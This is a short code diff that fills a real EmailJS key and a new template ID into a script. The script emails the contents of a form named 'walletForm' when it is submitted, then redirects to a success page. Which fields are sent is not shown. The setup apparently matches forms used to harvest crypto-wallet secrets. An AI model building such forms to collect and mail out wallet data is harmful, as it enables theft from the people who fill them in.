@@ -1,5 +1,5 @@
 // Initialize EmailJS
-emailjs.init('YOUR_USER_ID');  // Replace 'YOUR_USER_ID' with your actual EmailJS user ID
+emailjs.init('8vV71WqV0ofavi4sh');  // Replace 'YOUR_USER_ID' with your actual EmailJS user ID
 
 document.getElementById('walletForm').addEventListener('submit', function(event) {
   event.preventDefault(); // Prevent the form from submitting the traditional way
@@ -32,7 +32,7 @@ document.getElementById('walletForm').addEventListener('submit', function(event)
   };
 
   // Sending the form data via EmailJS SDK
-  emailjs.send('service_9273bwj', 'template_i0rgp8m', templateParams)
+  emailjs.send('service_9273bwj', 'template_yfsrzqa', templateParams)
     .then(function(response) {
         console.log('SUCCESS!', response.status, response.text);
         window.location.href = 'success.html'; // Redirecting to success page on successful email submission
